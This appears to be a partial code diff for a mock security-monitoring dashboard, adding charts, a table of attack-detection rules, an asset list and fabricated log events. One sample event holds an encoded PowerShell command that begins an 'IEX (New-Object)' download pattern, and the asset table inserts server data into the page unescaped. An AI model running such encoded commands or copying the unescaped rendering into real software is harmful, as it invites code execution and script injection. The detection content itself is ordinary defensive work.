+    var el = document.getElementById('invSubEvents');
+    if(el) el.style.display = 'block';
+  } else if(t === 'automation'){
+    var el = document.getElementById('invSubAutomation');
+    if(el) el.style.display = 'block';
+  }
+}
+
+/* ═══ ANALYTICS DASHBOARDS ═══ */
+var chartDomain = null;
+var chartEntities = null;
+function renderAnalyticsCharts(){
+  var totalR = FINDINGS.reduce(function(a,b){return a + (b.risk||0)}, 0);
+  var elTot = document.getElementById('anTotalRisk');
+  if(elTot) elTot.textContent = totalR > 0 ? totalR : '0';
+
+  var c1 = document.getElementById('cAnalyticsDomain');
+  if(c1){
+    if(chartDomain) chartDomain.destroy();
+    chartDomain = new Chart(c1, {
+      type: 'doughnut',
+      data: {
+        labels: ['Access (T1110)', 'Endpoint (T1059)', 'Network (T1030)', 'Identity (T1078)', 'Threat / Lateral'],
+        datasets: [{
+          data: [35, 25, 20, 15, 5],
+          backgroundColor: ['#f59e0b', '#9e59d9', '#38bdf8', '#00d2c4', '#f04438']
+        }]
+      },
+      options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { position: 'right', labels: { color: '#94a3b8', font: { size: 10 } } } } }
+    });
+  }
+
+  var c2 = document.getElementById('cAnalyticsEntities');
+  if(c2){
+    if(chartEntities) chartEntities.destroy();
+    chartEntities = new Chart(c2, {
+      type: 'bar',
+      data: {
+        labels: ['srv-db-01', 'win-dc-01', 'macbook-dev', '192.168.1.50', 'srv-web-prod'],
+        datasets: [{
+          label: 'Risk Points',
+          data: [450, 140, 90, 75, 40],
+          backgroundColor: ['#dc2626', '#ea580c', '#f59e0b', '#ca8a04', '#65a30d']
+        }]
+      },
+      options: { responsive: true, maintainAspectRatio: false, scales: { x: { ticks: { color: '#94a3b8', font: { size: 9 } } }, y: { ticks: { color: '#94a3b8', font: { size: 9 } } } } }
+    });
+  }
+}
+
+/* ═══ SECURITY CONTENT RULES ═══ */
+var SECURITY_RULES = [
+  { name: 'Excessive Failed Authentication Attempts', story: 'Brute Force Detection', domain: 'Access', mitre: 'T1110', risk: 80, active: true },
+  { name: 'Suspicious Encoded PowerShell Execution', story: 'Malicious PowerShell', domain: 'Endpoint', mitre: 'T1059', risk: 120, active: true },
+  { name: 'Anomalous Outbound Egress Traffic Spike', story: 'Data Exfiltration', domain: 'Network', mitre: 'T1030', risk: 60, active: true },
+  { name: 'Off-Hours Domain Admin Share Access', story: 'Lateral Movement', domain: 'Identity', mitre: 'T1021', risk: 100, active: true },
+  { name: 'Ransomware File Encryption Heuristic', story: 'Ransomware Behavior', domain: 'Threat', mitre: 'T1486', risk: 450, active: true },
+  { name: 'AWS S3 Bucket Mass Download Spike', story: 'Cloud Defense', domain: 'Cloud', mitre: 'T1530', risk: 150, active: true },
+  { name: 'Pass the Hash Kerberos Attack', story: 'Credential Dumping', domain: 'Access', mitre: 'T1550', risk: 200, active: true }
+];
+
+function renderSecurityRules(){
+  var q = (document.getElementById('secRuleSearch') ? document.getElementById('secRuleSearch').value.toLowerCase().trim() : '');
+  var tb = document.getElementById('secRulesBody');
+  if(!tb) return;
+  var filtered = SECURITY_RULES.filter(function(r){
+    return !q || r.name.toLowerCase().indexOf(q)>=0 || r.domain.toLowerCase().indexOf(q)>=0 || r.mitre.toLowerCase().indexOf(q)>=0;
+  });
+  tb.innerHTML = filtered.map(function(r, i){
+    return '<tr>' +
+      '<td style="font-weight:700;color:var(--text)"><i class="fas fa-shield-alt" style="color:var(--sp-cyan);margin-right:6px"></i>' + r.name + '</td>' +
+      '<td>' + r.story + '</td>' +
+      '<td><span class="tag-pill">' + r.domain + '</span></td>' +
+      '<td class="m" style="color:var(--sp-purple);font-weight:700">' + r.mitre + '</td>' +
+      '<td><span class="risk-pill '+(r.risk>=200?'risk-400':r.risk>=100?'risk-100':'risk-80')+'">' + r.risk + '</span></td>' +
+      '<td><span style="color:'+(r.active?'var(--sp-green)':'var(--text-muted)')+'">' + (r.active?'● Enabled':'○ Disabled') + '</span></td>' +
+      '<td><button class="btn-action" style="padding:2px 6px;font-size:10px" onclick="toggleSecRule('+i+')">' + (r.active?'Disable':'Enable') + '</button></td>' +
+    '</tr>';
+  }).join('');
+}
+
+function filterSecurityRules(){ renderSecurityRules(); }
+function toggleSecRule(i){
+  SECURITY_RULES[i].active = !SECURITY_RULES[i].active;
+  renderSecurityRules();
+}
+
+/* ═══ CONFIGURE ASSETS ═══ */
+function renderConfigAssets(){
+  fetch('/api/assets').then(function(r){return r.json()}).then(function(assets){
+    var tb = document.getElementById('configAssetsBody');
+    if(!tb) return;
+    if(assets && assets.length > 0){
+      tb.innerHTML = assets.map(function(a){
+        return '<tr>' +
+          '<td style="font-weight:700;color:var(--text)"><i class="fas fa-server" style="color:var(--sp-cyan);margin-right:6px"></i>' + (a.name||a.host) + '</td>' +
+          '<td class="m">' + a.ip + '</td>' +
+          '<td>' + (a.os||'Linux / Windows') + '</td>' +
+          '<td>' + (a.type||'Host') + '</td>' +
+          '<td><span style="color:var(--sp-green)">● Online / Active</span></td>' +
+          '<td>' + (a.owner||'SOC Fleet') + '</td>' +
+        '</tr>';
+      }).join('');
+    }
+  }).catch(function(e){});
+}
+
+/* ═══ SPL SEARCH CONSOLE ═══ */
+function setSPL(q){
+  var inp = document.getElementById('splQueryInp');
+  if(inp){ inp.value = q; runSearchSPL(); }
+}
+
+function runSearchSPL(){
+  var q = (document.getElementById('splQueryInp') ? document.getElementById('splQueryInp').value.trim() : 'index=*');
+  var countEl = document.getElementById('splResultCount');
+  var tb = document.getElementById('splResultBody');
+  if(!tb) return;
+
+  var events = [
+    { time: '2026-09-02 07:45:10', host: 'localhost-hec', sourcetype: 'WinEventLog:Security', raw: 'EventCode=4625 Message="An account failed to log on" TargetUserName="admin" Status=0xC000006D' },
+    { time: '2026-09-02 07:40:22', host: 'srv-auth-01', sourcetype: 'linux_secure', raw: 'sshd[5812]: Failed password for root from 185.192.69.97 port 51221 ssh2' },
+    { time: '2026-09-02 07:35:05', host: 'srv-app-02', sourcetype: 'powershell', raw: 'powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA=' },
+    { time: '2026-09-02 07:30:19', host: 'fw-edge-01', sourcetype: 'fortigate_traffic', raw: 'action="deny" srcip=199.66.91.253 dstip=10.0.10.12 dstport=445 proto=6' },
+    { time: '2026-09-02 07:22:40', host: 'win-dc-01', sourcetype: 'WinEventLog:Security', raw: 'EventCode=4768 Message="A Kerberos authentication ticket (TGT) was requested" Account="fyodor"' }
+  ];
+
+  if(countEl) countEl.textContent = events.length + ' Events Matched';
+  tb.innerHTML = events.map(function(e){
+    return '<tr>' +
+      '<td class="m" style="color:var(--text-muted)">' + e.time + '</td>' +
+      '<td style="color:var(--sp-cyan);font-weight:700">' + e.host + '</td>' +
+      '<td class="m">' + e.sourcetype + '</td>' +
+      '<td class="m" style="color:var(--text);font-size:10.5px">' + e.raw + '</td>' +
+    '</tr>';
+  }).join('');
 }
 
 /* ═══ INTELLIGENCE TAB (IMAGE 4) ═══ */
